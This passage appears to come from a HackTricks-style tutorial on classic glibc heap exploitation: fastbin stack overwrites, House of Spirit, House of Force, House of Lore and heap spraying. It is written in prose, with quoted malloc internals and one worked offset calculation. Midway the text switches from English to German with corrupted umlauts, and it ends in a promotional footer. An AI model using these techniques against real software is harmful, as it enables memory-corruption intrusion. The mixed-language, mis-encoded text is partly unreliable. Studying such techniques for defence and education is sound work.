Moreover, this same fake chunk must be smaller than av->system\_mem. av->system\_mem is located 1848 bytes beyond.

Due to the nulls of \_DTOR\_END\_ and the few addresses in the GOT, none of these sections' addresses are suitable for overwriting. Let's see how to apply fastbin to attack the stack.

Another way of attack is redirecting the **av** to the stack.

If we modify the size to be 16 instead of 8, then: fastbin\_index() will return fastbins\[0\], and we can use this to overwrite the stack.

For this, there should be no canary or weird values on the stack; in fact, we need to find this: 4 null bytes + EBP + RET

The 4 null bytes are needed for the **av** to be at this address, and the first element of an **av** is the mutex, which must be 0.

The **av->max\_fast** will be the EBP and will be a value that will help us bypass the restrictions.

In **av->fastbins\[0\]**, the address of **p** will be overwritten, and it will be the RET, thus jumping to the shellcode.

Additionally, in **av->system\_mem** (1484 bytes above the stack position), there will be enough garbage to bypass the check.

Moreover, the contiguous chunk to the freed one must be larger than 8 -> Since we have mentioned that the size of the freed chunk is 16, in this fake chunk, we just need to put a size larger than 8 (also, since the shellcode will be in the freed chunk, we need to put a jmp at the beginning that falls into nops that come after the size field of the new fake chunk).

**The House of Spirit**

In this case, we aim to have a pointer to a malloc that can be altered by the attacker (e.g., the pointer is on the stack below a potential overflow to a variable).

Thus, we could make this pointer point wherever we want. However, not every location is valid; the size of the faked chunk must be smaller than av->max\_fast and more specifically equal to the size requested in a future malloc() call + 8. Therefore, if we know that after this vulnerable pointer, a malloc(40) is called, the size of the fake chunk must be 48.

For example, if the program asks the user for a number, we could enter 48 and point the modifiable malloc pointer to the next 4 bytes (which could belong to EBP with luck, so the 48 remains behind, as if it were the size header). Additionally, the address ptr-4+48 must meet several conditions (in this case, ptr=EBP), that is, 8 < ptr-4+48 < av->system\_mem.

If this is met, when the next malloc call, which we said was malloc(40), is made, the EBP address will be assigned. If the attacker can also control what is written in this malloc, they can overwrite both the EBP and the EIP with the desired address.

I think this is because when it is freed, free() will save that at the address pointing to the EBP of the stack, there is a chunk of the perfect size for the new malloc() being reserved, so it assigns that address.

**The House of Force**

It is necessary:

* An overflow to a chunk that allows overwriting the wilderness
* A call to malloc() with the size defined by the user
* A call to malloc() whose data can be defined by the user

The first thing to do is overwrite the size of the wilderness chunk with a very large value (0xffffffff), so any sufficiently large memory request will be handled in \_int\_malloc() without the need to expand the heap.

The second step is to alter av->top to point to a memory area under the attacker's control, such as the stack. In av->top, \&EIP - 8 will be placed.

We need to overwrite av->top to point to the memory area under the attacker's control:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim collects the value of the current wilderness chunk address (the current av->top), and remainder is exactly the sum of that address plus the number of bytes requested by malloc(). So, if \&EIP-8 is at 0xbffff224 and av->top contains 0x080c2788, then the amount we need to reserve in the controlled malloc for av->top to point to $EIP-8 for the next malloc() will be:

0xbffff224 - 0x080c2788 = 3086207644.

This way, the altered value will be saved in av->top, and the next malloc will point to EIP and can be overwritten.

It is important to ensure that the size of the new wilderness chunk is larger than the request made by the last malloc(). That is, if the wilderness is pointing to \&EIP-8, the size will be right in the EBP field of the stack.

**The House of Lore**

**SmallBin Corruption**

The freed chunks are placed in the bin based on their size. But before being placed, they are stored in unsorted bins. When a chunk is freed, it is not immediately placed in its bin but remains in unsorted bins. Next, if a new chunk is requested and the previously freed one can be used, it is returned; otherwise, if a larger chunk is requested, the freed chunk in unsorted bins is placed in its appropriate bin.

To reach the vulnerable code, the memory request must be greater than av->max\_fast (usually 72) and less than MIN\_LARGE\_SIZE (512).

If there is a chunk in the bin of the appropriate size for the request, it is returned after unlinking it:

bck = victim->bk; Points to the previous chunk, the only info we can alter.

bin->bk = bck; The penultimate chunk becomes the last one, and if bck points to the stack, the next reserved chunk will be given this address.

bck->fd = bin; The list is closed by making it point to bin.

Requirements:
Reservieren Sie zwei mallocs, so dass das erste nach der Freigabe des zweiten √ºberlaufen werden kann und in seinen Bin eingef√ºgt wird (dh ein malloc gr√∂√üer als der zweite Abschnitt reserviert wird, bevor der √úberlauf erfolgt).

Der vom Angreifer gew√§hlte Speicherbereich des reservierten mallocs muss kontrolliert werden.

Das Ziel ist es, wenn wir einen Heap √ºberlaufen k√∂nnen, der darunter einen bereits freigegebenen und in seinem Bin befindlichen Abschnitt hat, k√∂nnen wir seinen bk-Pointer √§ndern. Wenn wir seinen bk-Pointer √§ndern und dieser Abschnitt der erste in der Bin-Liste wird und reserviert wird, wird die Bin get√§uscht und glaubt, dass der n√§chste Abschnitt in der falschen Adresse liegt, die wir angegeben haben (zum Beispiel im Stack oder GOT). Wenn also ein weiterer Abschnitt reserviert wird und der Angreifer Berechtigungen daf√ºr hat, wird ihm ein Abschnitt an der gew√ºnschten Position gegeben und er kann dort schreiben.

Nachdem der modifizierte Abschnitt freigegeben wurde, muss ein gr√∂√üerer Abschnitt als der freigegebene reserviert werden, damit der modifizierte Abschnitt aus den unsortierten Bins entfernt und in seinen Bin eingef√ºgt wird.

Sobald er in seinem Bin ist, ist es an der Zeit, seinen bk-Pointer durch den √úberlauf zu √§ndern, damit er auf die gew√ºnschte Adresse zeigt.

Daher muss die Bin warten, bis malloc() ausreichend oft aufgerufen wird, damit der modifizierte Bin erneut verwendet wird und die Bin t√§uscht, indem sie glaubt, dass der n√§chste Abschnitt in der falschen Adresse liegt. Dann wird der gew√ºnschte Abschnitt gegeben.

Um die Verwundbarkeit so schnell wie m√∂glich auszunutzen, w√§re ideal: Reservierung des verwundbaren Abschnitts, Reservierung des Abschnitts, der ge√§ndert wird, Freigabe dieses Abschnitts, Reservierung eines gr√∂√üeren Abschnitts als des zu √§ndernden, √Ñnderung des Abschnitts (Verwundbarkeit), Reservierung eines Abschnitts gleicher Gr√∂√üe wie der verwundene und Reservierung eines zweiten Abschnitts gleicher Gr√∂√üe, der auf die gew√§hlte Adresse zeigt.

Zum Schutz vor diesem Angriff wird die typische √úberpr√ºfung verwendet, dass der Abschnitt "nicht" falsch ist: Es wird √ºberpr√ºft, ob bck->fd auf victim zeigt. Das hei√üt, in unserem Fall, ob der fd-Pointer des falschen Abschnitts, der im Stack angezeigt wird, auf victim zeigt. Um diesen Schutz zu umgehen, m√ºsste der Angreifer in der Lage sein, auf die richtige Weise (wahrscheinlich √ºber den Stack) die Adresse von victim in die richtige Adresse zu schreiben. Damit es wie ein echter Abschnitt aussieht.

**Korruption LargeBin**

Die gleichen Anforderungen wie zuvor sind erforderlich, und zus√§tzlich m√ºssen die reservierten Abschnitte gr√∂√üer als 512 sein.

Der Angriff ist wie zuvor, dh der bk-Pointer muss ge√§ndert werden und all diese malloc()-Aufrufe sind erforderlich, aber zus√§tzlich muss die Gr√∂√üe des modifizierten Abschnitts so ge√§ndert werden, dass diese Gr√∂√üe - nb < MINSIZE ist.

Zum Beispiel muss die Gr√∂√üe auf 1552 gesetzt werden, damit 1552 - 1544 = 8 < MINSIZE (die Subtraktion kann nicht negativ sein, da ein unsigned Wert verglichen wird).

Dar√ºber hinaus wurde ein Patch eingef√ºhrt, um es noch komplizierter zu machen.

**Heap Spraying**

Es besteht im Wesentlichen darin, so viel wie m√∂glich Speicher f√ºr Heaps zu reservieren und diese mit einer Schicht von Nops gefolgt von einer Shellcode zu f√ºllen. Au√üerdem wird 0x0c als Polster verwendet. Es wird versucht, zur Adresse 0x0c0c0c0c zu springen, und wenn also eine Adresse √ºberschrieben wird, die mit diesem Polster aufgerufen wird, wird dorthin gesprungen. Im Wesentlichen besteht die Taktik darin, so viel wie m√∂glich zu reservieren, um zu sehen, ob ein Pointer √ºberschrieben wird, und zu 0x0c0c0c0c zu springen, in der Hoffnung, dass dort Nops vorhanden sind.

**Heap Feng Shui**

Es besteht darin, durch Reservierungen und Freigaben den Speicher so zu strukturieren, dass reservierte Abschnitte zwischen freien Abschnitten verbleiben. Der zu √ºberlaufende Puffer wird in einem der freien Abschnitte platziert.

## Interessante Kurse

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Referenzen**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
